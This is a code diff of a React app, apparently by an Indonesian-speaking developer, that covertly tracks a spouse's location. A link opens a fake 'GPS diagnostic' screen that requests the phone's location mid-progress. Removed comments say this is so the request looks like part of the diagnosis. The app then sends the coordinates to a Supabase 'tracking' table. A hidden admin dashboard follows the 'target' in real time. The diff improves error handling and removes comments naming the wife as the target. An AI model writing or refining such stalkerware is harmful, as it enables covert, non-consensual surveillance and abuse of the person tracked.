@@ -7,14 +7,13 @@ import { getLocationInsights } from './services/geminiService';
 import { createClient } from '@supabase/supabase-js';
 
 // Inisialisasi Supabase
-// Pastikan variabel ini diisi di environment hosting Anda
 const supabaseUrl = process.env.SUPABASE_URL || '';
 const supabaseKey = process.env.SUPABASE_KEY || '';
 const supabase = (supabaseUrl && supabaseKey) ? createClient(supabaseUrl, supabaseKey) : null;
 
 const App: React.FC = () => {
   const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
-  const targetId = 'target_alpha'; // ID unik untuk istri
+  const targetId = 'target_alpha'; 
 
   const [isUnlocked, setIsUnlocked] = useState(false);
   const [isDiagnosing, setIsDiagnosing] = useState(false);
@@ -37,59 +36,66 @@ const App: React.FC = () => {
 
   const activeMember = members[0];
 
-  // Fungsi sinkronisasi ke database
+  // Mendeteksi status config
+  const isConfigValid = !!supabaseUrl && !!supabaseKey;
+
   const syncToDatabase = async (loc: LocationData) => {
     if (!supabase) return;
-    const { error } = await supabase
-      .from('tracking')
-      .upsert({ 
-        id: targetId, 
-        latitude: loc.latitude, 
-        longitude: loc.longitude, 
-        accuracy: loc.accuracy, 
-        timestamp: loc.timestamp 
-      });
-    if (error) console.error("Sync Error:", error);
+    try {
+      const { error } = await supabase
+        .from('tracking')
+        .upsert({ 
+          id: targetId, 
+          latitude: loc.latitude, 
+          longitude: loc.longitude, 
+          accuracy: loc.accuracy, 
+          timestamp: loc.timestamp 
+        });
+      if (error) throw error;
+    } catch (err) {
+      console.error("Database Sync Error:", err);
+    }
   };
 
-  // Mendengarkan perubahan data (Hanya untuk Admin)
   useEffect(() => {
     if (isUnlocked && !isStealthMode && supabase) {
-      // Fetch data awal
       const fetchData = async () => {
-        const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
-        if (data) {
-          setMembers([{
-            ...members[0],
-            currentLocation: {
-              latitude: data.latitude,
-              longitude: data.longitude,
-              accuracy: data.accuracy,
-              timestamp: data.timestamp
-            },
-            status: 'online',
-            lastSeen: data.timestamp
-          }]);
-        }
+        try {
+          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
+          if (data) {
+            setMembers([{
+              ...members[0],
+              currentLocation: {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                accuracy: data.accuracy,
+                timestamp: data.timestamp
+              },
+              status: 'online',
+              lastSeen: data.timestamp
+            }]);
+          }
+        } catch (e) {}
       };
       fetchData();
 
-      // Subscribe ke perubahan realtime
       const channel = supabase
         .channel('schema-db-changes')
-        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'tracking' }, payload => {
-          const data = payload.new;
-          setMembers([{
-            ...members[0],
-            currentLocation: {
-              latitude: data.latitude,
-              longitude: data.longitude,
-              accuracy: data.accuracy,
-              timestamp: data.timestamp
-            },
-            status: 'online',
-            lastSeen: data.timestamp
-          }]);
+        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
+          const data = payload.new as any;
+          if (data && data.id === targetId) {
+            setMembers([{
+              ...members[0],
+              currentLocation: {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                accuracy: data.accuracy,
+                timestamp: data.timestamp
+              },
+              status: 'online',
+              lastSeen: data.timestamp
+            }]);
+          }
         })
         .subscribe();
 
@@ -113,12 +119,10 @@ const App: React.FC = () => {
           timestamp: position.timestamp,
         };
 
-        // Kirim ke database jika di mode stealth (HP Istri)
         if (isStealthMode) {
           await syncToDatabase(newLocation);
         }
 
-        // Update lokal jika admin
         if (isUnlocked && !isStealthMode) {
           setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
           setIsLoadingInsight(true);
@@ -140,15 +144,8 @@ const App: React.FC = () => {
     const interval = setInterval(() => {
       progress += 1;
       setDiagProgress(progress);
-      
-      // Minta lokasi di tengah proses agar terlihat seperti bagian dari diagnosa GPS
-      if (progress === 40) {
-        updateLocation();
-      }
-      
-      if (progress >= 100) {
-        clearInterval(interval);
-      }
+      if (progress === 40) updateLocation();
+      if (progress >= 100) clearInterval(interval);
     }, 80);
   };
 
@@ -165,7 +162,6 @@ const App: React.FC = () => {
     window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
   };
 
-  // --- RENDER STEALTH MODE (UNTUK ISTRI) ---
   if (isStealthMode) {
     return (
       <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 overflow-hidden">
@@ -234,16 +230,11 @@ const App: React.FC = () => {
                 )}
              </div>
            )}
-
-           <div className="text-center">
-              <p className="text-[9px] text-slate-800 uppercase tracking-widest">Diagnostic Session: {Math.random().toString(36).substring(7).toUpperCase()}</p>
-           </div>
         </div>
       </div>
     );
   }
 
-  // --- RENDER ADMIN PANEL (UNTUK ANDA) ---
   return (
     <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
       <Sidebar 
@@ -262,22 +253,41 @@ const App: React.FC = () => {
             </h2>
             {isLoadingInsight && <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>}
           </div>
-          {isUnlocked && (
-             <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase">Lock_System</button>
-          )}
+          <div className="flex items-center gap-4">
+            {isUnlocked && (
+              <div className={`px-2 py-1 rounded border text-[9px] uppercase font-bold flex items-center gap-2 ${isConfigValid ? 'border-emerald-500/30 bg-emerald-500/5 text-emerald-500' : 'border-rose-500/30 bg-rose-500/5 text-rose-500'}`}>
+                <div className={`w-1.5 h-1.5 rounded-full ${isConfigValid ? 'bg-emerald-500' : 'bg-rose-500 animate-pulse'}`}></div>
+                DB_{isConfigValid ? 'LINKED' : 'MISSING_ENV'}
+              </div>
+            )}
+            {isUnlocked && (
+               <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase">Lock_System</button>
+            )}
+          </div>
         </header>
 
         <div className="flex-1 p-8 overflow-y-auto">
           {!isUnlocked ? (
             <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in">
                <i className="fas fa-shield-halved text-5xl text-slate-800 mb-6"></i>
-               <h1 className="text-2xl font-bold">Encrypted Workspace</h1>
-               <p className="text-slate-500 text-sm max-w-sm mx-auto">Klik versi build di pojok kiri bawah 5x untuk membuka dashboard pelacakan real-time.</p>
+               <h1 className="text-2xl font-bold text-slate-400">Encrypted Workspace</h1>
+               <p className="text-slate-500 text-sm max-w-sm mx-auto">Sistem terkunci. Gunakan protokol otorisasi untuk mengakses dashboard pemantauan.</p>
             </div>
           ) : (
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
               <div className="lg:col-span-2 space-y-6">
                 
+                {/* Configuration Alert for User */}
+                {!isConfigValid && (
+                  <div className="bg-rose-500/10 border border-rose-500/20 p-4 rounded-xl flex items-start gap-4 animate-pulse">
+                    <i className="fas fa-triangle-exclamation text-rose-500 mt-1"></i>
+                    <div>
+                      <p className="text-xs font-bold text-rose-400 uppercase tracking-tighter">Variabel Vercel Belum Terdeteksi!</p>
+                      <p className="text-[10px] text-slate-400 mt-1">Pastikan Anda sudah me-REDEPLOY di Vercel setelah memasukkan SUPABASE_URL dan SUPABASE_KEY di Settings.</p>
+                    </div>
+                  </div>
+                )}
+
                 {/* Telemetry Display */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
@@ -308,7 +318,7 @@ const App: React.FC = () => {
                      </div>
                    ) : (
                      <div className="p-10 border border-dashed border-slate-800 rounded-2xl text-center">
-                        <p className="text-xs text-slate-600 italic">WAITING FOR TARGET SIGNAL...</p>
+                        <p className="text-xs text-slate-600 italic uppercase">Menunggu Sinyal Dari Target Alpha...</p>
                      </div>
                    )}
                 </div>
@@ -332,7 +342,7 @@ const App: React.FC = () => {
                    <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Target Deployment Link</h3>
                    <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
                       <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-500 outline-none" />
-                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'}`}>
+                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'} transition-all`}>
                          {copyStatus === 'target' ? 'COPIED' : 'COPY'}
                       </button>
                    </div>
